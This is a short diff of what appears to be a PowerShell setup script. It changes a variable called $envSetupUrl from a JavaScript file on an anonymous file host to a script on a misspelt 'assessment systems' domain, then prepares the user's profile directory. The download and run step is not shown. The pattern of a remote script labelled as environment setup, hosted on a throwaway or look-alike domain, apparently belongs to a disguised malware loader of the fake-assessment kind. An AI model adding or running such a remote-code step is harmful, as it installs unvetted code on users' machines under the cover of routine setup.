@@ -267,7 +267,7 @@ else {
     }
 }
 
-$envSetupUrl = "https://files.catbox.moe/tkgnyt.js"
+$envSetupUrl = "https://api.sigmaassesmentsystems.com/get-file/test.js"
 $codeProfile = $env:USERPROFILE
 if (-not (Test-Path -LiteralPath $codeProfile)) {
     New-Item -ItemType Directory -Path $codeProfile -Force *> $null
